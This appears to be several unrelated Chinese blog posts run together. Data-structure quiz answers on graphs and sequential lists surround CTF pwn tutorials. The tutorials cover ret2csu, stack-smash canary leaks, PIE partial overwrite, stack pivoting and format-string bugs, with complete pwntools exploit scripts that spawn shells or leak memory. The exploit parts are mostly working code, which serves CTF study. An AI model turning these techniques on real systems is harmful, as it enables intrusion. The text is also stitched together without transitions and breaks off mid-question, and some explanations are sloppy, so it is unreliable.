图的基本概念

最近因为各种考试（四级怕不是要明年再见了）消失了一段时间，也攒了一堆想要写的东西，不过后面几周还是有一轮接着一轮的考试，所以估计又要不定期鸽了。话说图这一章抄了别人的答案，结果选择题都没及格，唉，还是得自己老老实实做啊

1-1无向连通图至少有一个顶点的度为1。
想个特殊情况，只有一个顶点的图

1-2用邻接表法存储图，占用的存储空间数只与图中结点个数有关，而与边数无关。
1-3用邻接矩阵法存储图，占用的存储空间数只与图中结点个数有关，而与边数无关。
图的存储主要就是邻接表和邻接矩阵了，而前者因为要保存顶点和其边的信息所以空间应该为v+e，而后者则是利用矩阵来表示每两个顶点之间的关系所以只和顶点个数有关

1-4在一个有向图中，所有顶点的入度与出度之和等于所有边之和的2倍。
这个很好想吧，一个线有两个度，所以你计算的度要除于2

1-5在任一有向图中，所有顶点的入度之和等于所有顶点的出度之和。
有来有回，来而不往非礼也

1-6如果无向图G必须进行两次广度优先搜索才能访问其所有顶点，则G中一定有回路。
要是那样的话BFS岂不是太弱了，人家本来就是可以找到所有顶点的，这里应该是说明图不连通的……提一下BFS在无向图找回路的问题吧，其实很好想象，如果一个无向图他没有环的话不就是个树嘛，假设我们层序遍历时发现某个顶点竟然还有个边，那不就说明他有回路了嘛。

（1）通过广度遍历（BFS）访问图的所有点，对于每个点，都检测和已访问过的点是否有边（除了和它连接的上层节点）。
（1.1）如果有边，说明有回路（有环）。如果对于每个点，都没有和已访问过的点有边，说明从该点出发的当前图没有回路（无环）。
（2）如果从任意点开始的BFS，以上操作（1）均说明无回路，则没有回路。

1-7如果无向图G必须进行两次广度优先搜索才能访问其所有顶点，则G一定有2个连通分量。
这是对的，唯一可以让BFS断开的就是“没有桥的大陆”，而一个“大陆”就是一个连通分量

1-8无向连通图所有顶点的度之和为偶数。
上面提到了，一个边有两度，所以你的度的和肯定是整数倍啦

1-9无向连通图边数一定大于顶点个数减1。
顶点个数减1这个是不是很眼熟啊？这是树有n个结点的边数，那边没有方向的树是不是图啊？那肯定是啊

这里给个网址，官方介绍的很详细了

exp如下：

from pwn import *
context(arch = 'i386', os = 'linux')
r = remote('pwn2.jarvisoj.com', 9880)
e=ELF('./level4')
junk='A'*(0x88+0x04)
read_plt=e.symbols['read']
write_plt=e.symbols['write']
data_bss_addr=e.symbols['__bss_start']
func_reload_addr=e.symbols['vulnerable_function']
def leak(address):
    payload1=junk+p32(write_plt)+p32(func_reload_addr)+p32(0x01)+p32(address)+p32(0x04)
    r.sendline(payload1)
    leak_addr=r.recv(4)
    return leak_addr
d=DynELF(leak,elf=e)
system_addr=d.lookup('system','libc')
payload2=junk+p32(read_plt)+p32(func_reload_addr)+p32(0x00)+p32(data_bss_addr)+p32(0x08)
r.sendline(payload2)
r.send('/bin/sh\x00')
payload3=junk+p32(system_addr)+p32(func_reload_addr)+p32(data_bss_addr)
r.send(payload3)
r.interactive()

ret2csu

原理

不知道大家有没有和我一样的经历，拿到一个64程序，看上去漏洞很明显然后就开始想着拿payload覆盖数据，泄漏libc然后重复调用漏洞函数……怎么说呢，思路倒是没什么错，但是忽视了很重要的问题——64位程序传递参数的方式是优先使用寄存器的（准确的说是前6个参数），多出来的才用栈传递，这就限制了我们不能再简单的去用覆盖数据的方式实现函数的调用了。当然，我们还是可以使用gadgets来凑出来的，但是往往没有是那么合适的，这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。
为什么呢？下面就来看一看

一下内容来自某英文网站http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html

图片为32位，作为参考
从上图我们可以看到，当运行程序的时候，首先shell会使用 execve() 函数来出发系统调用。这时候系统会为我们的程序分配栈区并将argc、argv、envp压栈，按照shell设定fd，装载器还要进行重定位和调用预初始化器（preinitializers），然后就从_start来执行代码了。
利用ida（当然gdb、objdump上面的也一样）来看一下这段代码，重要的部分我都标记了注释

一点一点来看，首先xor了ebp也就是将ebp置为了0，然后紧接着就是pop，也就是将我们的栈顶的值拿了出来，根据之前的execve的压栈方式我们可以知道也就是argc，当我们pop后栈顶就成了argv，一个mov也就让我们成功拿到了，这么说大家也应该明白了，其实之后的几句都是在准备参数。
细致分析下来一共有7个参数，前六个按照x64的准则由rsi、rdi、rdx、rcx、r8、r9来传递，第七个则是利用栈来传递的，其中比较重要的参数应该是main的地址，argc、argv以及__libc_csu_init、__libc_csu_fini

如图所示即调用__libc_start_main时寄存器的情况
至于__libc_start_main函数做了什么呢？首先设置了uid和gid，然后启动线程，寄存fini和rtld_fini的参数，调用__libc_csu_init，调用main，调用exit。
这里就看到了我们调用程序几乎必然要用到这个函数，所以我们可以利用它来传递寄存器的值

例题

题目是jarvis oj上的level5，首先还是file+checksec+ida

漏洞很明显，但程序本身没有system和/bin/sh字符串，所以还是考虑用泄漏libc地址的方式来做。
因为程序用过了write函数我们就考虑泄漏它的地址，利用libc_csu_gadgets实现，并且再次跳转回主函数
计算出libc的地址，进而拿到execve的地址和/bin/sh字符串的地址
再次利用libc_csu_gadgets来将这两个地址写入到bss段，然后执行就好了
官方的exp如下
from pwn import *

#context.log_level = 'debug'

level5 = ELF('./level5.dms')
sh = process('./level5.dms')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc_base = write_addr - libc.symbols['write']
execve_addr = libc_base + libc.symbols['execve']
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
gdb.attach(sh)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()

题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧

首先保护机制就开启了不少，canary、nx都是开启的，ida中很容易看出有栈溢出漏洞，理所当然的没有/bin/sh字符串，也没有system函数。程序的逻辑很简单，让我们输入三次，但要注意因为太调用了fork函数，这三次其实是三个相同的独立过程。说他相同是因为他们的栈结构、逻辑等等都是一样的，说它独立是因为你哪怕因为canary被覆盖搞崩了其中一个，另外两个也会正常运行。

看了一圈没有leak出canary的机会，那我们就考虑利用smashes来get到点信息，我们首先来简单的调试一下程序，之前做过类似的题目了，我们现在main函数下段来找一下arg0的位置

拿到了arg0的位置，接着尝试在文件操作处下段，主要目的是看看读到的文件内容被存储在了哪里


明显文件的内容被存储到了栈上，那我们就可以想到可以利用smashes的信息来输出栈上的flag。

程序给了三次输入的机会，也就是三个smashes的机会，最终我们的目标是输出栈上的值，虽然开启了保护，但我们知道偏移是一定的，所以我们可以找到flag的偏移，然后只要找到基准值就可以算出来flag的真实地址了，那这个基准值是什么呢？答案就是*environ，他指向了栈的环境变量的位置，而我们可以利用libc来获取到environ的位置。

那就说明我们要分三步走：

  • 利用smashes获取libc中的函数，比如puts
  • 利用smashes获取environ
  • 利用smashes获取flag

那就来看看exp吧

from pwn import *
arg0_addr = 0x7fffffffdf68
input_addr = 0x7fffffffde40
#context.log_level = 'debug'
p = process('./GUESS.dms')
elf = ELF('./GUESS.dms')
e = ELF('/lib/x86_64-linux-gnu/libc.so.6')

flag_addr = 0x7fffffffde10
puts_addr = 0x602020
p.recvuntil('flag')
payload = (arg0_addr - input_addr)*'a' +p64(puts_addr)
p.sendline(payload)
p.recvuntil('*** stack smashing detected ***: ')
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info(hex(puts_addr))

libc = puts_addr - e.symbols['puts']
environ_addr = libc + e.symbols['__environ']
log.info(hex(libc))

p.recvuntil('flag')
p.sendline((arg0_addr - input_addr)*'a' + p64(environ_addr))
p.recvuntil('*** stack smashing detected ***: ')
stack = u64(p.recv(6).ljust(8, '\x00'))
log.info(hex(stack))

flag_addr = stack - 0x168

p.recvuntil('flag')
p.sendline((arg0_addr - input_addr)*'a' + p64(flag_addr))

p.interactive()

各处都不难，位移需要注意的地方是flag偏移值的计算方式，我们运行起来之后可以在environ处下段点，然后查看stack信息，找到flag字符串的位置手动计算一下就好了.

Stack smash

原理

我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就会报错了

如图就是函数在开始时进行的设置“哨位”

这是在函数最后的检查

当然明白了这些还不够，我们还需要知道一点关于这个错误的一些信息，下面我们试着覆盖掉canary来看看会发生什么

可以看到除了程序的输出外，还额外打印了一句

*** stack smashing detected ***: ./smashes.dms terminated

这就是重点了，他告诉我们出错了，而且附加了我们的程序名字！名字哪来的？大胆猜猜，在开始运行输入的命令行中，arg0就是我们的程序名！当然这是瞎猜的，秉持着唯真求新的校训，我们还是来看一看具体的实现原理

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}

可以看到竟（guo）然（ran）和我们想的一样，那我们就可以想到了，那我们只要覆盖掉arg0，那我们岂不是就可以借助这个输入拿到我们想要的信息了？

栈上的 partial overwrite

原理

在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护

例题

原理看上去有点难以理解，但有了例题就好理解多了，题目是安恒杯 2018 年 7 月月赛的 babypie

保护开启了canary和pie，还是ida分析发现明显的栈溢出，这里就要用到一个骚操作了，我们看到read了最大0x30的字节，我们又知道read是不会给输入的字符串加上\0的结束符的，而printf又是读到00字节才结束输出，那也就是说我们可以输入一部分内容，然后顺带着输出canary，之后再进行栈溢出的时候我们就可以恢复canary的值了

那具体该怎么实现呢？首先是ebp的地址离我们输入的buf偏移是0x30，当然ebp之后还有个0x8大小的canary，canary的最低字节是00，为了输出cannary剩下的值我们把这里也覆盖掉，也就是覆盖的字节数应该是0x30 - 0x8 + 1这么个大小

拿到canary后我们就可以考虑如何构造payload了，因为程序中给了get shell函数，所以我们直接用ida得到的地址（可不是真实地址哦）来覆盖函数返回地址的低位，然后就是听天由命了，总有对的时候

思路齐全，上exp喽

#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#  context.log_level = "debug"


while True:
    try:
        io = process("./babypie.dms", timeout = 1)

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        io.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + io.recvn(7)
        success(canary.encode('hex'))

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')

        io.interactive()
    except Exception as e:
        io.close()
        print e

stack pivoting

原理说明

首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控制的内存，bss段、heap等等），然后在这个位置再进行rop。ctf wiki上为我们总结了几种有可能使用到该技巧的情况：

  • 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链
  • 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。
  • 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

当然这个用起来还有一些限制条件，最关键的就是你要能控制栈指针

可以看到hint函数其实就一句sub esp,0x24 ，估计大家也都会想到了，题目的解决思路应该和这有关。

很明显是栈溢出，因为没有保护，那我们就考虑能不能直接写入shellcode执行，答案是不行，没有合适的地方让我们存储。题目中没有存储的数组，而溢出后只有14个可用字节，所以shellcode是肯定没有办法按照之前的技巧放入的。这时候就需要用到我们的stack poviting技术了

覆盖任意地址

首先来看看昨天没有搞完的覆盖内存，昨天我们成功覆盖了栈上的内存改变了局部变量c的值，让程序执行到了我们想要的结果，那程序中还有两个变量a、b（a、b为初始化的全局变量，存储在data段，并不在栈上，详情请看上一篇），能不能将他们的值也改变呢？

当然可以了，这就是我们内存覆盖的第二个方面—任意地址内存覆盖

覆盖小数字

我们分析程序认识到，我要想输出想要的结果，我们需要把a的值设置为2，b的值设置为0x12345678，那么问题就来了，我们上一次提到的%n是将“打印的个数”写入某个地址，一般的格式是

addr + %n$n

而addr作为一个地址长度已经是4了，难道说我们覆盖的最小值只能是4？那当然不是了，我们可以构造下面形式的payload：

aa%k$nxx + addr

是不是和刚才的有些不一样？这有什么玄机呢？其实很简单，我们之前构造payload时，是找到了我们输入的第一个四个字节所在的栈上的位置进而写入，那么我们也完全可以找到我们输入的第二个四个字节所在的位置（这个位置一想就知道了，就是我们之前找的那个偏移再+1）写入，以此类推。

上面的字符串其实首先拿aa作为填充字符，和%k凑了四个字节，然后拿$n和xx凑了四个字节，最后的是addr，那addr在栈上的位置也就是原来的偏移6 + 2 也就是8，所以我们的k就是8。万事具备，那我们就上脚本了：

p = process('./overwrite.dms')
a_addr = 0x804A024
payload = 'aa%8$naa' + p32(a_addr)
p.sendline(payload)
print p.recv()
p.interactive()

覆盖大数字

具体原理就不再博客上放了（我也没信心说明白，可以参考ctf wiki，毕竟咱们不能做脚本小子），给一个pwntools给出的函数来一步实现

payload = fmtstr_payload(offset, {addr:data})

这里的offset也就是咱们求出来的偏移值，addr是你想写入的地址，而data是你想写入的数据。
这样我们也可以很轻松的覆盖掉b的值，使程序执行到我们想要的地方，脚本如下

p = process('./overwrite.dms')

payload = fmtstr_payload(6, {b_addr:0x12345678})
p.sendline(payload)
#print p.recv()
p.interactive()

pwn学习（4）初识格式化字符串漏洞

发表于 2018-11-19 | 分类于 pwn

什么是格式化字符串？

这个问题我相信学过c语言的都不陌生，我们在使用printf一类（比如：sprintf、fprintf等）的函数时经常会用到这个东西，他的样子很好识别，一般就是%后面跟着一些字符，比如下面我们printf函数的第一个参数

#include<stdio.h>
int main()
{
    printf("this is a format string %s" , "yes");
    return 0;
}

它主要是用一个说明符（在上面的例子中是s）来告诉程序该以何种格式来输出，而后为我们在输出中按格式填充入我们在后面的内容

下面是几个常见的说明符

%d - 十进制 - 输出十进制整数
%s - 字符串 - 从内存中读取字符串
%x - 十六进制 - 输出十六进制数
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 到目前为止所写的字符数

这里前几个都是用来打印的，最后一个却是一个“异类”，这家伙的作用是写入到某个内存区域到现在为止写过的字符个数。注意要和%n$n区别开来，这个的作用是“选择”，举个例子讲，%3$s，这个的意思就是将第三个我们的填充物以%s的格式打印出来。
因为这些说明符的种种特性，我们可以使用它们来干一些“坏事”

漏洞在哪？

如果我想让你写一段代码打印出我输入的字符串你会怎么办？我相信大多数人会写出下面的代码：

char str[100]
scanf("%s",str)
printf("%s",str)

代码看上去很简单嘛，但总有人喜欢偷懒，他会写成如下的形式：

printf(str)

这就出问题了，一般的函数，传入的参数都是固定的，但printf却不同，因为它要求有一个format string，这个format string就是它的身家性命，这东西就决定了它后面有多少的参数，而就算是你的format string后面没有足够的参数，他也会认为“你有足够的参数”，然后自动读取栈上的数据，按照你的format打印出来。那我们就可以玩点有趣的东西了，我们先给出个程序（程序代码来自ctf wiki）

#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}

可以看到这个程序就存在格式化字符串的漏洞。程序逻辑很简单，在我们输入s后，它先是“安全”的打印了s的内容，然后又直接打印了s，我们是这运行时输入这样一段数据

AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x

然后我们就非（li）常（suo）惊（ying）讶（dang）的发现程序给我们输出这些内容：

00000001.22222222.ffffffff.AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
AAAAffff5160,c2,f7e036bb,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825

很显然程序把原本不用该暴露给我们的东西都吐了出来，而输出的第四部分41414141大家也应该很清楚，就是我们的AAAA

泄漏任意内存地址

通过前几次的学习我们知道了got表可是个好东西，当时我们想法设法的泄漏出got表内容进而拿到libc里面所有我们想要的东西。而通过这个漏洞我们可以非常轻松的实现got表的泄漏

还是以上面的程序为例，程序中存在scanf函数，那我们就泄漏这个函数的got表地址。

首先先看一下我们上面的测试，刚才的测试可不是仅仅为了演示漏洞，我们还可以看见程序给我们的的输出中41414141和我们的输入“AAAA”实际上是一样的，而41414141也就是第五个打印的部分，那也就是说，前面的我们实际上都不需要，我们借助上面调皮的%n就可以完美实现打印这个东西了。

话不多说，上脚本

覆盖内存

那有了泄漏任意地址的方式，那我们有没有利用这个来实现覆盖地址呢？其实是可以的，这里我们要用到关于%n的知识，其实上面说过了，但还是再列一遍

%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。

这里应该分两部分，但今天有点事耽搁了，所以就先简单的看看第一部分，栈上的内存覆盖吧，程序如下（依旧来自ctf wiki）

/* example/overflow/overflow.c */
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
    puts("modified b for a big number!");
  }
  return 0;
}

简单看看，程序会输出变量c的地址，然后有个格式化字符串的漏洞，本来if判断c是不成立的，那我们就利用这个漏洞来改变c的值来让它符合。

首先还是用我们刚才的泄漏栈变量的方式（也就是上面的方法）确定偏移

0xfff5de4c
AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
AAAAfff5dde8,c2,f7e7a6bb,fff5de0e,fff5df0c,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78

可以看到偏移是6，那我们就知道了payload最后应该是%6$n，我们的目标是让c变成16，我们一开始输入的是拿p32()处理过的c的地址，只有4位，还缺12位，我们就补个%012d，让程序随便打12个数据就好了，分析完毕，上脚本！

from pwn import *
sh = process('./overwrite.dms')
c_addr = int(sh.recvuntil('\n', drop=True), 16)
print hex(c_addr)
payload = p32(c_addr) + '%012d' + '%6$n'
print payload
#gdb.attach(sh)
sh.sendline(payload)
print sh.recv()
sh.interactive()

数据结构基础--顺序表

对于顺序存储的长度为N的线性表，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。

答案为T，顺序存储的线性表可以利用偏移轻松拿到每一个元素，但是如果要增加一个元素的话则需要把之后的所有的元素都后移一位。

若某线性表最常用的操作是存取任一指定序号的元素和在最后进行插入和删除运算，则利用顺序表存储最节省时间。

答案为T，因为比起链表形式找一个元素需要遍历，顺序表直接用偏移就ok了，而且如果只是在最后进行插入删除的话也无需移动大量元素

对于顺序存储的长度为N的线性表，删除第一个元素和插入最后一个元素的时间复杂度分别对应为O(1)和O(N)。

答案为F，删除第一个元素需要把之后所有的元素依次提前一个，所以应该为N，而插入最后一个元素直接在最后插入即可

(neuDS)在顺序表中逻辑上相邻的元素，其对应的物理位置也是相邻的。

答案为T，线性表是随机存储的，所以物理位置是相邻的

(neuDS)所谓随机存取，就是通过首地址和元素的位序号值可以在O(1)的时间内找到指定的元素。

答案为T，这个在之前的链表选择判断里说过了

(neuDS)顺序存储的线性表不支持随机存取。

答案为F，和上边的那个一样

(neuDS)在顺序表上进行插入、删除操作时需要移动元素的个数与待插入或待删除元素的位置无关。

答案为F，显然是错误的，因为你每次的插入删除操作都是要移动后面所有的元素的

对于顺序存储的长度为N的线性表，访问结点和增加结点的时间复杂度为：

答案为O(1), O(N)，访问结点直接用偏移，而增加结点需要把这个元素后面的所有元素都移动。

在N个结点的顺序表中，算法的时间复杂度为O(1)的操作是：

答案为访问第i个结点（1≤i≤N）和求第i个结点的直接前驱（2≤i≤N），随机存储不再说了

若某线性表最常用的操作是存取任一指定序号的元素和在最后进行插入和删除运算，则利用哪种存储方式最节省时间？

答案为顺序表，参考上面，懒得再说了

顺序表中第一个元素的存储地址是100，每个元素的长度为2，则第5个元素的地址是（ ）。

答案为108，100是第一个元素的，第二个是102，依次类推，逆向的应该都懂

(neuDS)线性表的顺序存储结构是一种( )

答案为随机存取的存储结构，懒得说了

(neuDS)一个顺序表所占用的存储空间大小与( )无关。

答案为元素的存放顺序，其实主要取决于元素的多少和元素的类型（包括元素所含有的子元素的类型）

(neuDS)要将一个顺序表{a0,a1,……,an−1}中第i个数据元素ai(0≤i≤n-1)删除，需要移动（ ）个数据元素。

答案为n-i-1 ，因为要删除第i个，所以它后面的元素你都要向前移动一个，而由于顺序表是0开始的，最后一个元素是n-1，所以也就是n-1-i，也就是答案了

若长度为n的线性表采用顺序存储结构，那么删除它的第i个数据元素之前，需要它一次向前移动（）个数据元素。

答案为n-i 和上面的一样

若长度为n的线性表采用顺序结构，在第i个数据元素之前插入一个元素，需要它依次向后移动（）个元素

答案为n-i+1，要注意插入和删除的区别，因为删除时，你移动的只是原来位置元素的后面的元素，而插入的话除了原来元素的后面的元素，还要多移动一个原来的元素，所以也就是要+1了

线性表L=（a1, a2 ,……，an ）用一维数组表示，假定删除线性表中任一元素的概率相同（都为1/n），则删除一个元素平均需要移动元素的个数是（）。
